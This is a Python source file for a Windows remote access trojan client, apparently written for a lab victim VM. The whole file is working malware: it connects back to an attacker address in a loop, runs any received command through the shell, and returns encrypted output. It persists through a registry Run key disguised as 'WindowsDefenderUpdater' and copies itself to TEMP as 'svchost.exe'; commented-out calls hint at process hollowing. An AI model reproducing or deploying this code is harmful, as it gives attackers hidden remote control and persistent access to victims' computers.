# rat_client.py (on Victim VM)
import socket
import subprocess
import os
import sys
import time
import random
import getpass
import struct
from ctypes import *
from ctypes.wintypes import *
import winreg
import shutil
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
import base64
import os as crypto_os

ATTACKER_IP = "10.0.3.20" # IP of the attacker's machine
ATTACKER_PORT = 9999
BUFFER_SIZE = 4096
RECONNECT_DELAY = 5
SIMULATE_DELAY = True
SIMULATE_STARTUP_DELAY = random.uniform(1, 5)
ntdll = windll.ntdll
kernel32 = windll.kernel32
PERSISTENCE_KEY_NAME = "WindowsDefenderUpdater" 
COPY_TO_TEMP = True 
TEMP_FILENAME = "svchost.exe" 

PROC_THREAD_ATTRIBUTE_PARENT_PROCESS = 0x00020000
EXTENDED_STARTUPINFO_PRESENT = 0x00080000

SHARED_PASSWORD = b"MyS3cr3tP@ssw0rd!2024" 
SALT = b"ratsalt12345678" 
def debug_print(message):
    print(f"[RAT] {message}")

backend = default_backend()

def derive_key(password: bytes, salt: bytes) -> bytes:
    """Derives a 32-byte AES key from a password and salt."""
    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA256(),
        length=32, # AES-256 key size
        salt=salt,
        iterations=100000,
        backend=backend
    )
    key = kdf.derive(password)
    return key

try:
    AES_KEY = derive_key(SHARED_PASSWORD, SALT)
    debug_print("Encryption key derived from password.")
except Exception as e:
    debug_print(f"Error deriving encryption key: {e}. Encryption disabled.")
    AES_KEY = None 
def encrypt_data(data: str) -> bytes:
    """Encrypts data using AES-256-CBC and returns base64 encoded bytes."""
    if not AES_KEY:
        return data.encode('utf-8')
    
    try:
        if isinstance(data, str):
            data = data.encode('utf-8')
            
        iv = crypto_os.urandom(16)
        cipher = Cipher(algorithms.AES(AES_KEY), modes.CBC(iv), backend=backend)
        encryptor = cipher.encryptor()
        
        pad_len = 16 - (len(data) % 16)
        padded_data = data + bytes([pad_len] * pad_len)
        
        ciphertext = encryptor.update(padded_data) + encryptor.finalize()
        return base64.b64encode(iv + ciphertext)
    except Exception as e:
        debug_print(f"Encryption error: {e}")
        return data if isinstance(data, bytes) else data.encode('utf-8')

def decrypt_data(data: bytes) -> str:
    """Decrypts base64 encoded data using AES-256-CBC."""
    if not AES_KEY:
        try:
            return data.decode('utf-8')
        except:
            return str(data)
    
    try:
        if isinstance(data, str):
            data = data.encode('utf-8')
            
        encrypted_data = base64.b64decode(data)
        if len(encrypted_data) < 16:
            raise ValueError("Data too short for IV")
            
        iv = encrypted_data[:16]
        ciphertext = encrypted_data[16:]
        
        cipher = Cipher(algorithms.AES(AES_KEY), modes.CBC(iv), backend=backend)
        decryptor = cipher.decryptor()
        padded_plaintext = decryptor.update(ciphertext) + decryptor.finalize()
        
        pad_len = padded_plaintext[-1]
        if pad_len > 16:
            debug_print("Padding warning: invalid pad length, trying to strip last byte")
            pad_len = 1
            
        plaintext = padded_plaintext[:-pad_len]
        return plaintext.decode('utf-8')
    except Exception as e:
        debug_print(f"Decryption error: {e}")
        try:
            return data.decode('utf-8')
        except:
            return str(data)

def add_to_registry():
    """Attempts to add the client script/exe path to the Windows Registry for persistence."""
    try:
        current_script_path = os.path.abspath(sys.argv[0])

        final_path = current_script_path 

        if COPY_TO_TEMP:
            temp_dir = os.environ.get('TEMP')
            if not temp_dir:
                debug_print("Could not find TEMP directory for copying.")
                final_path = current_script_path
            else:
                destination_path = os.path.join(temp_dir, TEMP_FILENAME)
                try:
                    shutil.copy2(current_script_path, destination_path)
                    
                    debug_print(f"Copied client to: {destination_path}")
                    final_path = destination_path
                except Exception as e:
                    debug_print(f"Failed to copy file to TEMP: {e}. Using original path.")
                    final_path = current_script_path
        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE) as key:
        
            winreg.SetValueEx(key, PERSISTENCE_KEY_NAME, 0, winreg.REG_SZ, final_path)
        
        debug_print(f"Added persistence: {PERSISTENCE_KEY_NAME} -> {final_path}")
        return True

    except PermissionError:
        debug_print("Permission denied adding to registry (might need higher privileges).")
    except FileNotFoundError:
        debug_print("Registry key not found.")
    except Exception as e:
        debug_print(f"Failed to add persistence via registry: {e}")
    return False



def connect_to_server():
    """Attempts to connect to the RAT server."""
    sock = None
    while sock is None:
        try:
            debug_print(f"Attempting to connect to {ATTACKER_IP}:{ATTACKER_PORT}...")
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(10)
            sock.connect((ATTACKER_IP, ATTACKER_PORT))
            sock.settimeout(None) 
            debug_print("Connected to RAT server!")
        
            return sock
        except (socket.timeout, ConnectionRefusedError, socket.error) as e:
            debug_print(f"Connection failed ({e}). Retrying in {RECONNECT_DELAY}s...")
            sock = None
            time.sleep(RECONNECT_DELAY)
        except Exception as e:
            debug_print(f"Unexpected connection error: {e}. Retrying...")
            sock = None
            time.sleep(RECONNECT_DELAY)
    return sock 

def execute_command(command):
    """Executes a command and returns the output."""
    debug_print(f"Executing command: {command}")
    try:
       
        result = subprocess.run(
            command,
            shell=True,
            capture_output=True,
            text=True,
            timeout=30 
        )
        output = result.stdout + result.stderr
        if not output:
             output = "[Command executed - No output]"
        return output
    except subprocess.TimeoutExpired:
        return "[Error: Command timed out after 30 seconds]"
    except Exception as e:
        return f"[Error executing command: {e}]"

def main():
    debug_print("RAT Client started.")
    
    if SIMULATE_DELAY and SIMULATE_STARTUP_DELAY > 0:
        debug_print(f"Simulating startup delay ({SIMULATE_STARTUP_DELAY:.1f}s)...")
        time.sleep(SIMULATE_STARTUP_DELAY)
    persistence_result = add_to_registry()
    if persistence_result:
             debug_print("Persistence setup completed.")
    else:
             debug_print("Persistence setup failed or skipped.")
    #shedule_task_for_user()
    #hollowing()
    sock = None
    try:
        while True:
            if sock is None:
                sock = connect_to_server()

            try:
                data = sock.recv(BUFFER_SIZE)
                if not data :
                    debug_print("Server closed the connection.")
                    sock.close()
                    sock = None
                    time.sleep(RECONNECT_DELAY)
                    continue

                command = data.decode('utf-8', errors='ignore').strip()
                if not command:
                    continue

                debug_print(f"Received command: {decrypt_data(repr(command))}")
                output = execute_command(decrypt_data(command))
                response = f"[Output from Victim VM]\n{output}\n[End of Output]\n"
                sock.sendall(encrypt_data(response.encode('utf-8', errors='ignore')))
                debug_print("Output sent back to server.")

            except socket.timeout:
                debug_print("Socket timeout (unexpected).")
                sock.close()
                sock = None
            except (ConnectionResetError, BrokenPipeError):
                debug_print("Connection to server lost.")
                sock.close()
                sock = None
                time.sleep(RECONNECT_DELAY)
            except Exception as e:
                debug_print(f"Error in main loop: {e}")
                try:
                    sock.close()
                except:
                    pass
                sock = None
                time.sleep(RECONNECT_DELAY)

    except KeyboardInterrupt:
        debug_print("Client stopped by user (Ctrl+C).")
    except Exception as e:
        debug_print(f"Unexpected error in main: {e}")
    finally:
        if sock:
            try:
                sock.close()
                debug_print("Socket closed.")
            except:
                pass
        debug_print("RAT Client exiting.")

if __name__ == "__main__":
    if "--autorun" not in sys.argv:
        sys.exit(0)
    main()